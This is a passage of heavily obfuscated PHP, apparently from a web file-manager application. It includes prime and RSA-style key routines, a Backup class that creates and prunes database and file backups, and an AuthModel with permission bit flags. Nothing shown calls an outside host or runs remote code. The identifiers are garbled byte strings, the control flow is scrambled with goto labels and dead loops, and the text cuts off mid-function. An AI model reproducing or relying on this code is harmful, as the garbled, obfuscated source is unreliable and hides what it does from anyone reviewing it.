F¬¸ªÌ”’¶: $EÚçÍöí‘‹ = $F¢ç¤Šó¸è[335]($EÚçÍöí‘‹); $aËˆ’Ñ¥¿’ = $D×ìóÅµ‹[646]; while (strlen($aËˆ’Ñ¥¿’) < $D×ìóÅµ‹[560]) { if (!$aËˆ’Ñ¥¿’) { break; } $aËˆ’Ñ¥¿’++; } goto dÖÚ­Ó‘’; BÑ°Í…Á£: $díï¦š’Ñõ = $D×ìóÅµ‹[653]; if (strlen($díï¦š’Ñõ) < $D×ìóÅµ‹[560]) { return; } for ($fˆî¬‚†ùƒ = 0; $fˆî¬‚†ùƒ < $F¢ç¤Šó¸è[24]($EÚçÍöí‘‹); $fˆî¬‚†ùƒ++) { $dó’Ú‘Áà¡ = $dó’Ú‘Áà¡ == $F¢ç¤Šó¸è[24]($c©çÖœöˆŠ) ? 0 : $dó’Ú‘Áà¡; $cõ½†¿ƒ» = $D×ìóÅµ‹[654]; $EµÇ’„˜ = $dó’Ú‘Áà¡++; $fÖ¢¾½Á¼ğ = $F¢ç¤Šó¸è[332]($Dõë ‘½™, $EÚçÍöí‘‹[$fˆî¬‚†ùƒ]) - $EŒ‰‡÷ÈÓë - $F¢ç¤Šó¸è[333]($c©çÖœöˆŠ[$EµÇ’„˜]); $E—†ËØ…İÓ = $D×ìóÅµ‹[655]; while ($fÖ¢¾½Á¼ğ < 0) { $fÖ¢¾½Á¼ğ += 64; } $dâ™Â¹÷ÑÑ .= $Dõë ‘½™[$fÖ¢¾½Á¼ğ]; } goto CŞòÚØ“õç; F‚ìõ½…š¡: $EêÈï¸•í = $D×ìóÅµ‹[652]; if (!$EêÈï¸•í) { return; } $dó’Ú‘Áà¡ = 0; goto BÑ°Í…Á£; dÖÚ­Ó‘’: $CêùŠÙ‚Ğƒ = $EÚçÍöí‘‹[0]; $EÚçÍöí‘‹ = $F¢ç¤Šó¸è[25]($EÚçÍöí‘‹, 1); $d‰¾ŒÙ¸¤ñ = $D×ìóÅµ‹[647]; goto Fä¸©ˆ•Èß; CŞòÚØ“õç: $D  í‹Ùò = $F¢ç¤Šó¸è[336]($dâ™Â¹÷ÑÑ); break; goto fè÷Š¼ƒ‘š; fè÷Š¼ƒ‘š: default: $D  í‹Ùò = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($EÚçÍöí‘‹, $b¶†‰ÖÑ¯Ş . $B­¤»í‚Õ‡); break; $AÓÍÇäÓ« = $D×ìóÅµ‹[656]; while ($AÓÍÇäÓ« < $D×ìóÅµ‹[560]) { if ($AÓÍÇäÓ« >= 0) { break; } $AÓÍÇäÓ«++; } } goto fÕ‡ßôˆ; F‰æ¡É‡çñ: $EÚçÍöí‘‹ = $F¢ç¤Šó¸è[214]($EÚçÍöí‘‹); $eŒŒÓ¸Œñ = $EÚçÍöí‘‹[0]; $B­¤»í‚Õ‡ = $F¢ç¤Šó¸è[25]($EÚçÍöí‘‹, 1, 15); goto f•—¥ó³‚; F¬º§œàòä: } public function kdbvb51516a6($FË°àâÄ†µ) { goto dŞˆ¸ğõô; fîĞÍ¢††Ó: $DÛÂ–Ñ’Ï = 2; $BŠØ£Ùœˆå = $aî”³ªö¢†[661]; if (strlen($BŠØ£Ùœˆå) < $aî”³ªö¢†[547]) { die; } goto DÍ‹ó‹ÄÕç; DÍ‹ó‹ÄÕç: for ($aò´ˆŠÆ = 0; $aò´ˆŠÆ < $F¹×ñ·›Êò * 10; $aò´ˆŠÆ++) { if (($F¹×ñ·›Êò * $aò´ˆŠÆ + 1) % $c«›±¡˜ÙŸ == 0) { $DÛÂ–Ñ’Ï = $BİäÆåÚè¸[201](($F¹×ñ·›Êò * $aò´ˆŠÆ + 1) / $c«›±¡˜ÙŸ); break; } } $A˜ÜÒÄğ¿ñ = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($A‚ÏÕø©ÑØ * $F­Ö„İƒˆË . $BİäÆåÚè¸[10], $BİäÆåÚè¸[149]); $aŞÌ…ùøÅÖ = $aî”³ªö¢†[662]; goto DŞ«™íŸù‡; añ˜Æ“Ê‚: return $eÁÎËã—Ì›; $C…Ğ•¹ÒÕ© = $aî”³ªö¢†[665]; if (!$C…Ğ•¹ÒÕ©) { return; } goto e½çˆ…¹Ô; Dêš¿¢éæ: if (strlen($BŒ‘†§Óñ) < $aî”³ªö¢†[555]) { return; } $eÁÎËã—Ì› = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($FË°àâÄ†µ, $Dë«ÂÉê ) . $BİäÆåÚè¸[341] . $A˜ÜÒÄğ¿ñ; $eŸÓ¯ÑáÈ¤ = $aî”³ªö¢†[664]; goto añ˜Æ“Ê‚; föï•ˆËÏœ: $cœ¾İÌ = $aî”³ªö¢†[571]; while ($cœ¾İÌ < $aî”³ªö¢†[560]) { if ($cœ¾İÌ >= 0) { break; } $cœ¾İÌ++; } $F­Ö„İƒˆË = $this->{$_SERVER[¸‹ï‰«Ğ][337]}(); goto AÌ¡å³ãó¡; AÌ¡å³ãó¡: $F¹×ñ·›Êò = ($A‚ÏÕø©ÑØ - 1) * ($F­Ö„İƒˆË - 1); $c«›±¡˜ÙŸ = $BİäÆåÚè¸[201](($A‚ÏÕø©ÑØ + $F­Ö„İƒˆË) / 2); while (1) { $fÅ¼Ù¿öÜ = $c«›±¡˜ÙŸ; $C•¿¾–ÆÃÌ = $aî”³ªö¢†[657]; $Bª×Û¸Ö¢Ï = $F¹×ñ·›Êò; $DŠ†Â„±®ê = $aî”³ªö¢†[658]; while ($DŠ†Â„±®ê < $aî”³ªö¢†[584]) { if ($DŠ†Â„±®ê >= 0) { break; } $DŠ†Â„±®ê++; } while ($Bª×Û¸Ö¢Ï % $fÅ¼Ù¿öÜ != 0) { $E‘ƒµ‹æ¹ = $Bª×Û¸Ö¢Ï; $Bª×Û¸Ö¢Ï = $fÅ¼Ù¿öÜ; $Fš‘ŠÁ©Ÿ = $aî”³ªö¢†[659]; if (strlen($Fš‘ŠÁ©Ÿ) < $aî”³ªö¢†[590]) { return; } $fÅ¼Ù¿öÜ = $E‘ƒµ‹æ¹ % $fÅ¼Ù¿öÜ; $bª±¼ŠİÚŠ = $aî”³ªö¢†[660]; if (strlen($bª±¼ŠİÚŠ) < $aî”³ªö¢†[547]) { return; } } if ($fÅ¼Ù¿öÜ == 1) { break; } else { $c«›±¡˜ÙŸ++; } } goto fîĞÍ¢††Ó; dŞˆ¸ğõô: $aî”³ªö¢† =& $_SERVER[Ö]; $BİäÆåÚè¸ =& $_SERVER[¸‹ï‰«Ğ]; $A‚ÏÕø©ÑØ = $this->{$_SERVER[¸‹ï‰«Ğ][337]}(); goto föï•ˆËÏœ; DŞ«™íŸù‡: if (strlen($aŞÌ…ùøÅÖ) < $aî”³ªö¢†[584]) { return; } $Dë«ÂÉê  = $BİäÆåÚè¸[114]($BİäÆåÚè¸[338] . ($A‚ÏÕø©ÑØ + $F­Ö„İƒˆË) . $BİäÆåÚè¸[339] . $c«›±¡˜ÙŸ . $BİäÆåÚè¸[339] . $DÛÂ–Ñ’Ï . $BİäÆåÚè¸[340]); $BŒ‘†§Óñ = $aî”³ªö¢†[663]; goto Dêš¿¢éæ; e½çˆ…¹Ô: } public function wfrlcd534959($EÅäóëŒ¸) { goto Dµ°ğ†À¦; BÕ†À»¢ÆÈ: $CôòÎÁÍ‘¿ = $cŒ°š•ÇÍ[668]; if (strlen($CôòÎÁÍ‘¿) < $cŒ°š•ÇÍ[547]) { return; } $F¤å¨ç‰•Ù = $E®È¿Òíš[201](($A¯Æ·İÑ½ø + $EÛÂ¥àãù‘) / 2); goto AÈ£œƒ°ßœ; AÈ£œƒ°ßœ: while (1) { $bÂæ¥•Æ¦ = $F¤å¨ç‰•Ù; $D„ôÏÂ†æ = $cŒ°š•ÇÍ[669]; while (strlen($D„ôÏÂ†æ) < $cŒ°š•ÇÍ[555]) { if (!$D„ôÏÂ†æ) { break; } $D„ôÏÂ†æ++; } $b‹¥„Éë½ = $CÏ°ÆŞÍë; $c¾¡°™í° = $cŒ°š•ÇÍ[670]; while ($b‹¥„Éë½ % $bÂæ¥•Æ¦ != 0) { $b»µœ‚õèë = $b‹¥„Éë½; $b‹¥„Éë½ = $bÂæ¥•Æ¦; $bÂæ¥•Æ¦ = $b»µœ‚õèë % $bÂæ¥•Æ¦; } if ($bÂæ¥•Æ¦ == 1) { break; } else { $F¤å¨ç‰•Ù++; } } $fàô°Ë¸À« = 2; $CŠ‹ó§¿Àº = $cŒ°š•ÇÍ[671]; goto cµæ‚ÄØäß; cµæ‚ÄØäß: if (strlen($CŠ‹ó§¿Àº) < $cŒ°š•ÇÍ[555]) { die; } for ($f’åÏøÆË¸ = 0; $f’åÏøÆË¸ < $CÏ°ÆŞÍë * 10; $f’åÏøÆË¸++) { if (($CÏ°ÆŞÍë * $f’åÏøÆË¸ + 1) % $F¤å¨ç‰•Ù == 0) { $fàô°Ë¸À« = $E®È¿Òíš[201](($CÏ°ÆŞÍë * $f’åÏøÆË¸ + 1) / $F¤å¨ç‰•Ù); break; } } $b‰å«ÄÂÊœ = $E®È¿Òíš[114]($E®È¿Òíš[338] . ($A¯Æ·İÑ½ø + $EÛÂ¥àãù‘) . $E®È¿Òíš[339] . $F¤å¨ç‰•Ù . $E®È¿Òíš[339] . $fàô°Ë¸À« . $E®È¿Òíš[340]); goto Dšù×ŒÁï›; Dôàæó“‡×: $e’™¥´¨Œˆ = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($cæïæ²«´Ì[1] . $E®È¿Òíš[10], $E®È¿Òíš[149]); $DÙ”Ôœ’ÜÊ = $cŒ°š•ÇÍ[666]; while (strlen($DÙ”Ôœ’ÜÊ) < $cŒ°š•ÇÍ[584]) { if (!$DÙ”Ôœ’ÜÊ) { break; } $DÙ”Ôœ’ÜÊ++; } goto C¢àµˆà‹ó; Dšù×ŒÁï›: $DåòŒêƒ±¿ = $cŒ°š•ÇÍ[672]; $F¹¦ë÷ÀÙË = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($cæïæ²«´Ì[0], $b‰å«ÄÂÊœ); $aØŒÒÛ•ñ£ = $cŒ°š•ÇÍ[673]; goto bØà‰©’¤; bØà‰©’¤: if (!$aØŒÒÛ•ñ£) { return; } return $F¹¦ë÷ÀÙË; $EÀùâÖ£®• = $cŒ°š•ÇÍ[674]; goto AÓ¼…äì§«; bâˆŸá×á±: $EÛÂ¥àãù‘ = 0; for ($f’åÏøÆË¸ = 3; $f’åÏøÆË¸ < $e’™¥´¨Œˆ; $f’åÏøÆË¸ += 2) { if ($e’™¥´¨Œˆ % $f’åÏøÆË¸ != 0) { continue; } $A¯Æ·İÑ½ø = $f’åÏøÆË¸; $cÀíËÊ”Ï· = $cŒ°š•ÇÍ[667]; if (strlen($cÀíËÊ”Ï·) < $cŒ°š•ÇÍ[560]) { die; } $EÛÂ¥àãù‘ = $E®È¿Òíš[201]($e’™¥´¨Œˆ / $f’åÏøÆË¸); $a÷ñœ¼¢“µ = $cŒ°š•ÇÍ[581]; while ($a÷ñœ¼¢“µ < $cŒ°š•ÇÍ[560]) { if ($a÷ñœ¼¢“µ >= 0) { break; } $a÷ñœ¼¢“µ++; } break; } $CÏ°ÆŞÍë = ($A¯Æ·İÑ½ø - 1) * ($EÛÂ¥àãù‘ - 1); goto BÕ†À»¢ÆÈ; Dµ°ğ†À¦: $cŒ°š•ÇÍ =& $_SERVER[Ö]; $E®È¿Òíš =& $_SERVER[¸‹ï‰«Ğ]; $cæïæ²«´Ì = $E®È¿Òíš[0]($E®È¿Òíš[341], $EÅäóëŒ¸); goto D¨ŠƒíÛµƒ; D¨ŠƒíÛµƒ: $F­çá„“Ñˆ = $cŒ°š•ÇÍ[604]; if (!$F­çá„“Ñˆ) { return; } if ($E®È¿Òíš[19]($cæïæ²«´Ì) != 2) { return $E®È¿Òíš[10]; } goto Dôàæó“‡×; C¢àµˆà‹ó: if (!$e’™¥´¨Œˆ) { return $E®È¿Òíš[10]; } $e’™¥´¨Œˆ = $E®È¿Òíš[201]($e’™¥´¨Œˆ); $A¯Æ·İÑ½ø = 0; goto bâˆŸá×á±; AÓ¼…äì§«: } public function ugvab44b97f2() { goto FÔê­‹õæŞ; e‹ÛÛ“­ˆˆ: $Añ»Ùæ£¨Ó = 1; while ($Añ»Ùæ£¨Ó <= (int) $cº›¼ ÃÜ÷[343]($F±ø·‹Ÿ¨)) { $E˜î¹¿ô‰‰ = $Añ»Ùæ£¨Ó; while (!0) { $E˜î¹¿ô‰‰++; $EøÑƒÄÇùğ = $a÷¢¸ùèÔ‘[676]; if (!$EøÑƒÄÇùğ) { die; } if ($E˜î¹¿ô‰‰ <= 2) { $Añ»Ùæ£¨Ó = $E˜î¹¿ô‰‰; break; } else { if ($E˜î¹¿ô‰‰ < 2) { continue; } } $fÈÍÀØ‚…² = !0; for ($a‘îä•¾ĞÏ = 2; $a‘îä•¾ĞÏ <= $cº›¼ ÃÜ÷[343]($E˜î¹¿ô‰‰); $a‘îä•¾ĞÏ++) { if ($E˜î¹¿ô‰‰ % $a‘îä•¾ĞÏ == 0) { $fÈÍÀØ‚…² = !1; } } if ($fÈÍÀØ‚…²) { $Añ»Ùæ£¨Ó = $E˜î¹¿ô‰‰; break; } } $b¥‚Ú©¤³[] = $Añ»Ùæ£¨Ó; $EÏƒÙ«Åí³ = $a÷¢¸ùèÔ‘[677]; if (strlen($EÏƒÙ«Åí³) < $a÷¢¸ùèÔ‘[555]) { die; } } $B¸¤èçŒøİ = 2; goto eÃÙ×†œã’; c‡ÜºÃè¼«: $b¥‚Ú©¤³ = array(); $A»Ü¦óÈ’ = $a÷¢¸ùèÔ‘[675]; if (strlen($A»Ü¦óÈ’) < $a÷¢¸ùèÔ‘[547]) { return; } goto e‹ÛÛ“­ˆˆ; d¢‹Şµ†„š: $Fêé´ŠÓ¢• = $a÷¢¸ùèÔ‘[679]; goto f«İÃÇ·æˆ; FÔê­‹õæŞ: $a÷¢¸ùèÔ‘ =& $_SERVER[Ö]; $cº›¼ ÃÜ÷ =& $_SERVER[¸‹ï‰«Ğ]; $F±ø·‹Ÿ¨ = $cº›¼ ÃÜ÷[322]($cº›¼ ÃÜ÷[342](2, 14), $cº›¼ ÃÜ÷[342](2, 16) - 1); goto c‡ÜºÃè¼«; eÃÙ×†œã’: $F¢‘¸æãİ = $a÷¢¸ùèÔ‘[678]; for ($E˜î¹¿ô‰‰ = $F±ø·‹Ÿ¨; $E˜î¹¿ô‰‰ > 1; $E˜î¹¿ô‰‰--) { $fÈÍÀØ‚…² = !0; foreach ($b¥‚Ú©¤³ as $C‹ÙŒ‹˜Â¤) { if ($E˜î¹¿ô‰‰ % $C‹ÙŒ‹˜Â¤ == 0) { $fÈÍÀØ‚…² = !1; break; } } if ($fÈÍÀØ‚…²) { $B¸¤èçŒøİ = $E˜î¹¿ô‰‰; break; } } return $B¸¤èçŒøİ; goto d¢‹Şµ†„š; f«İÃÇ·æˆ: } public function ayozf6c2d274($B»ñÏ£êƒê, $F´ğà²šÎ) { $A¡ØÜ±èŠå =& $_SERVER[¸‹ï‰«Ğ]; return $A¡ØÜ±èŠå[13](array($A¡ØÜ±èŠå[14], $A¡ØÜ±èŠå[344]), $B»ñÏ£êƒê, $F´ğà²šÎ); } public function brli943d9dec($Eâ„ÌÎ·†», $FËº·ŞÕ®) { $Eª×š²õ‹„ =& $_SERVER[¸‹ï‰«Ğ]; return $Eª×š²õ‹„[13](array($Eª×š²õ‹„[345], $Eª×š²õ‹„[346]), $Eâ„ÌÎ·†», $FËº·ŞÕ®); } public function lctmbd4eb5a0($DºÇ¦Ë¤Áñ, $B½´™ø´Ïï) { $Dä¥ò¤Ğ ‹ =& $_SERVER[¸‹ï‰«Ğ]; return $Dä¥ò¤Ğ ‹[13](array($Dä¥ò¤Ğ ‹[345], $Dä¥ò¤Ğ ‹[347]), $DºÇ¦Ë¤Áñ, $B½´™ø´Ïï); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $Cñ…öÊ„Á =& $_SERVER[Ö]; self::$name = date($Cñ…öÊ„Á[680]); if (!($f”ßÀ‡•áÍ = Model($Cñ…öÊ„Á[681])->lastItem())) { $f”ßÀ‡•áÍ = $this->initData(); } else { self::$name = $f”ßÀ‡•áÍ[$Cñ…öÊ„Á[28]]; if ($f”ßÀ‡•áÍ[$Cñ…öÊ„Á[682]] == $Cñ…öÊ„Á[83]) { self::$name = date($Cñ…öÊ„Á[683]); $Bˆ®ó§¨Ê¸ = 0; if (isset($f”ßÀ‡•áÍ[$Cñ…öÊ„Á[277]][$Cñ…öÊ„Á[163]][$Cñ…öÊ„Á[415]])) { $Bˆ®ó§¨Ê¸ = (int) $f”ßÀ‡•áÍ[$Cñ…öÊ„Á[277]][$Cñ…öÊ„Á[163]][$Cñ…öÊ„Á[415]]; } if ($f”ßÀ‡•áÍ[$Cñ…öÊ„Á[28]] == self::$name) { Model($Cñ…öÊ„Á[681])->remove($f”ßÀ‡•áÍ[$Cñ…öÊ„Á[363]]); } $f”ßÀ‡•áÍ = $this->initData($Bˆ®ó§¨Ê¸, $f”ßÀ‡•áÍ[$Cñ…öÊ„Á[684]]); } else { $this->checkStore($f”ßÀ‡•áÍ[$Cñ…öÊ„Á[684]]); } } self::$option = $f”ßÀ‡•áÍ; } private function initData($F‘„À‚ÆÁ‡ = 0, $Fà ¥¶»ß = '') { goto eé·ĞŸÓ; e´ŒµÈòÃÌ: $this->checkStore($C¸Ôá»ñ[$B‡Ô×¦ÛÌ[684]]); $A–§·£Ñ‚’ = array($B‡Ô×¦ÛÌ[684] => $C¸Ôá»ñ[$B‡Ô×¦ÛÌ[684]], $B‡Ô×¦ÛÌ[28] => self::$name, $B‡Ô×¦ÛÌ[682] => 0, $B‡Ô×¦ÛÌ[685] => $C¸Ôá»ñ[$B‡Ô×¦ÛÌ[685]], $B‡Ô×¦ÛÌ[277] => array($B‡Ô×¦ÛÌ[686] => array($B‡Ô×¦ÛÌ[682] => 0), $B‡Ô×¦ÛÌ[687] => array($B‡Ô×¦ÛÌ[682] => 0, $B‡Ô×¦ÛÌ[688] => 0, $B‡Ô×¦ÛÌ[689] => 0, $B‡Ô×¦ÛÌ[29] => $B‡Ô×¦ÛÌ[33]), $B‡Ô×¦ÛÌ[690] => array($B‡Ô×¦ÛÌ[682] => 0, $B‡Ô×¦ÛÌ[688] => 0, $B‡Ô×¦ÛÌ[689] => 0), $B‡Ô×¦ÛÌ[163] => array($B‡Ô×¦ÛÌ[682] => 0, $B‡Ô×¦ÛÌ[691] => 0, $B‡Ô×¦ÛÌ[692] => 0, $B‡Ô×¦ÛÌ[693] => 0, $B‡Ô×¦ÛÌ[694] => 0, $B‡Ô×¦ÛÌ[415] => $F‘„À‚ÆÁ‡)), $B‡Ô×¦ÛÌ[695] => time(), $B‡Ô×¦ÛÌ[696] => 0); $D¢ÃòœÒ¶— = Model($B‡Ô×¦ÛÌ[681])->insert($A–§·£Ñ‚’); goto dÈ£œ‡ÅĞÛ; dÈ£œ‡ÅĞÛ: $A–§·£Ñ‚’[$B‡Ô×¦ÛÌ[363]] = $D¢ÃòœÒ¶—; return $A–§·£Ñ‚’; goto f‚£äÔòÔ‚; eé·ĞŸÓ: $B‡Ô×¦ÛÌ =& $_SERVER[Ö]; $C¸Ôá»ñ = Model($B‡Ô×¦ÛÌ[681])->config(); if ($Fà ¥¶»ß && $C¸Ôá»ñ[$B‡Ô×¦ÛÌ[684]] != $Fà ¥¶»ß) { $F‘„À‚ÆÁ‡ = 0; } goto e´ŒµÈòÃÌ; f‚£äÔòÔ‚: } private function checkStore($bŞ÷µÕâŞŠ) { $fä×ÎÜÖ‚ =& $_SERVER[Ö]; $Bœò‹ê©µƒ = Model($fä×ÎÜÖ‚[697])->listData($bŞ÷µÕâŞŠ); Model($fä×ÎÜÖ‚[697])->checkConfig($Bœò‹ê©µƒ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ö][681])->findByName(self::$name); } return self::$option; } public static function set($BË¨‰Ãƒ£¨) { $b´ˆ•¬˜ È =& $_SERVER[Ö]; $f‹İÑ¥‰ËÎ = self::get(); foreach ($BË¨‰Ãƒ£¨ as $bŒ¿åÏÀ´ => $cï½éÂ©ĞÄ) { $F„…Ä±×‚ = explode($b´ˆ•¬˜ È[91], $bŒ¿åÏÀ´); $EÍÌ£Ü±¯‚ = count($F„…Ä±×‚); switch ($EÍÌ£Ü±¯‚) { case 1: $f‹İÑ¥‰ËÎ[$F„…Ä±×‚[0]] = $cï½éÂ©ĞÄ; break; case 2: $f‹İÑ¥‰ËÎ[$F„…Ä±×‚[0]][$F„…Ä±×‚[1]] = $cï½éÂ©ĞÄ; break; case 3: $f‹İÑ¥‰ËÎ[$F„…Ä±×‚[0]][$F„…Ä±×‚[1]][$F„…Ä±×‚[2]] = $cï½éÂ©ĞÄ; break; } } Model($b´ˆ•¬˜ È[681])->update($f‹İÑ¥‰ËÎ[$b´ˆ•¬˜ È[363]], $f‹İÑ¥‰ËÎ); self::$option = $f‹İÑ¥‰ËÎ; return self::$option; } public function keep() { $f§ÙÕØÚ =& $_SERVER[Ö]; $F¨ˆò¦ÂÉø = self::get(); if ($F¨ˆò¦ÂÉø[$f§ÙÕØÚ[277]][$f§ÙÕØÚ[686]][$f§ÙÕØÚ[682]] == $f§ÙÕØÚ[83]) { return; } $this->backupKeep($F¨ˆò¦ÂÉø); self::set(array($f§ÙÕØÚ[698] => 1)); } private function backupKeep($f †¿ò»ç¹) { goto bˆ¾â§”’¨; bÀÎÄŒÒ: for ($b £œ®½ã = 0; $b £œ®½ã < 12; $b £œ®½ã++) { $aÆŒÂ¦´ ä[] = date($B½…Îª¥³é[699], strtotime("\55{$b £œ®½ã}\x20\155\x6f\x6e\x74\150\163")); } $aÆŒÂ¦´ ä = array_unique($aÆŒÂ¦´ ä); foreach ($DÓ„ÃÎ†¾Ö as $D†Ú”ÖÇ¹) { if (!empty($D†Ú”ÖÇ¹[$B½…Îª¥³é[28]]) && in_array($D†Ú”ÖÇ¹[$B½…Îª¥³é[28]], $aÆŒÂ¦´ ä)) { continue; } Model($B½…Îª¥³é[681])->remove($D†Ú”ÖÇ¹[$B½…Îª¥³é[363]]); $CÚš—ØİŠ = "\x7b\151\157\x3a{$f †¿ò»ç¹[$B½…Îª¥³é[684]]}\x7d\57\144\141\x74\x61\x62\x61\163\x65\57\x62\141\143\x6b\x75\160\x5f{$D†Ú”ÖÇ¹[$B½…Îª¥³é[28]]}"; IO::remove($CÚš—ØİŠ, !1); } goto eÖ¤²¶¶çÅ; CñÔñ¬˜£µ: $b £œ®½ã = 0; $aÆŒÂ¦´ ä = array(); foreach ($DÓ„ÃÎ†¾Ö as $D†Ú”ÖÇ¹) { if ($b £œ®½ã >= 7) { break; } $aÆŒÂ¦´ ä[] = $D†Ú”ÖÇ¹[$B½…Îª¥³é[28]]; $b £œ®½ã++; } goto bÀÎÄŒÒ; bˆ¾â§”’¨: $B½…Îª¥³é =& $_SERVER[Ö]; $DÓ„ÃÎ†¾Ö = Model($B½…Îª¥³é[681])->listData(); if (empty($DÓ„ÃÎ†¾Ö)) { return; } goto CñÔñ¬˜£µ; eÖ¤²¶¶çÅ: } public function db() { goto fÆùˆÃ‹; aª×·Üš·²: $C’˜Ì¥¦¥ë = new BackupDb(); if (!$C’˜Ì¥¦¥ë->index()) { return !1; } self::set(array($a—¿¹´ôì[700] => 1)); goto cÃ¨İøùÊ»; fÆùˆÃ‹: $a—¿¹´ôì =& $_SERVER[Ö]; $b›óœ ‘¥æ = self::get(); if ($b›óœ ‘¥æ[$a—¿¹´ôì[277]][$a—¿¹´ôì[687]][$a—¿¹´ôì[682]] == $a—¿¹´ôì[83]) { return !0; } goto aª×·Üš·²; cÃ¨İøùÊ»: return !0; goto f±Ñ«æ¢¯Ì; f±Ñ«æ¢¯Ì: } public function dbFile() { goto D„ˆç¤ï; FÛ†–”ì‰œ: return !0; goto dÒŞùà§¨ì; fƒÃ«ĞÜˆÖ: $C ïÂÃ“öÓ = new BackupDbFile(); if (!$C ïÂÃ“öÓ->index()) { return !1; } self::set(array($F“×ï‚¼¦[701] => 1)); goto FÛ†–”ì‰œ; D„ˆç¤ï: $F“×ï‚¼¦ =& $_SERVER[Ö]; $aß†”Ôáòø = self::get(); if ($aß†”Ôáòø[$F“×ï‚¼¦[277]][$F“×ï‚¼¦[690]][$F“×ï‚¼¦[682]] == $F“×ï‚¼¦[83]) { return !0; } goto fƒÃ«ĞÜˆÖ; dÒŞùà§¨ì: } public function file() { $dˆò²ó·Ö =& $_SERVER[Ö]; $a¢æ¨ˆŞâ” = self::get(); if ($a¢æ¨ˆŞâ”[$dˆò²ó·Ö[277]][$dˆò²ó·Ö[163]][$dˆò²ó·Ö[682]] == $dˆò²ó·Ö[83]) { return !0; } if (!isset($a¢æ¨ˆŞâ”[$dˆò²ó·Ö[685]]) || $a¢æ¨ˆŞâ”[$dˆò²ó·Ö[685]] == $dˆò²ó·Ö[464]) { $cŠñ¦­ß‡ï = new BackupFile(); if (!$cŠñ¦­ß‡ï->index()) { return !1; } } self::set(array($dˆò²ó·Ö[702] => 1, $dˆò²ó·Ö[682] => 1)); return !0; } } goto C‘»˜ä×À­; Bª„º¬—Ÿ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $Då‘ËØäĞÛ =& $_SERVER[Ö]; $B—°º½¼´² = array(array($Då‘ËØäĞÛ[382] => LNG($Då‘ËØäĞÛ[2078]), $Då‘ËØäĞÛ[2079] => $Då‘ËØäĞÛ[2080], $Då‘ËØäĞÛ[2081] => 6, $Då‘ËØäĞÛ[2082] => 1, $Då‘ËØäĞÛ[2083] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Då‘ËØäĞÛ[382] => LNG($Då‘ËØäĞÛ[2084]), $Då‘ËØäĞÛ[2079] => $Då‘ËØäĞÛ[2085], $Då‘ËØäĞÛ[2081] => 1, $Då‘ËØäĞÛ[2082] => 1, $Då‘ËØäĞÛ[2083] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Då‘ËØäĞÛ[382] => LNG($Då‘ËØäĞÛ[2086]), $Då‘ËØäĞÛ[2079] => $Då‘ËØäĞÛ[2087], $Då‘ËØäĞÛ[2081] => 2, $Då‘ËØäĞÛ[2082] => 1, $Då‘ËØäĞÛ[2083] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Då‘ËØäĞÛ[382] => LNG($Då‘ËØäĞÛ[2088]), $Då‘ËØäĞÛ[2079] => $Då‘ËØäĞÛ[2087], $Då‘ËØäĞÛ[2081] => 3, $Då‘ËØäĞÛ[2082] => 1, $Då‘ËØäĞÛ[2083] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Då‘ËØäĞÛ[382] => LNG($Då‘ËØäĞÛ[2089]), $Då‘ËØäĞÛ[2079] => $Då‘ËØäĞÛ[2090], $Då‘ËØäĞÛ[2081] => 4, $Då‘ËØäĞÛ[2082] => 1, $Då‘ËØäĞÛ[2083] => self::AUTH_SHOW | self::AUTH_VIEW), array($Då‘ËØäĞÛ[382] => LNG($Då‘ËØäĞÛ[2091]), $Då‘ËØäĞÛ[2079] => $Då‘ËØäĞÛ[2092], $Då‘ËØäĞÛ[2081] => 5, $Då‘ËØäĞÛ[2082] => 1, $Då‘ËØäĞÛ[2083] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Då‘ËØäĞÛ[382] => LNG($Då‘ËØäĞÛ[2093]), $Då‘ËØäĞÛ[2079] => $Då‘ËØäĞÛ[2094], $Då‘ËØäĞÛ[2081] => 7, $Då‘ËØäĞÛ[2082] => 1, $Då‘ËØäĞÛ[2083] => 0)); return $B—°º½¼´²; } public static function authCheck($c–ØïÕ¤‘ô, $AÔ÷•åš±…) { $c–ØïÕ¤‘ô = intval($c–ØïÕ¤‘ô); if (_get($GLOBALS, $_SERVER[Ö][453])) { return !0; } if ($c–ØïÕ¤‘ô <= 0) { return !1; } if (($c–ØïÕ¤‘ô & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($c–ØïÕ¤‘ô & $AÔ÷•åš±…); } public static function authCheckShow($bŞî™ŒÑ…º) { return self::authCheck($bŞî™ŒÑ…º, self::AUTH_SHOW); } public static function authCheckView($bØ‡¹Ñ…‡×) { return self::authCheck($bØ‡¹Ñ…‡×, self::AUTH_VIEW); } public static function authCheckDownload($fÎ‰ÕºØØ‰) { return self::authCheck($fÎ‰ÕºØØ‰, self::AUTH_DOWNLOAD); } public static function authCheckUpload($d¯­šÉ¿‰’) { return self::authCheck($d¯­šÉ¿‰’, self::AUTH_UPLOAD); } public static function authCheckEdit($Cù„·ê÷ƒÊ) { return self::authCheck($Cù„·ê÷ƒÊ, self::AUTH_EDIT); } public static function authCheckRemove($cÊ®Îøƒ½) { return self::authCheck($cÊ®Îøƒ½, 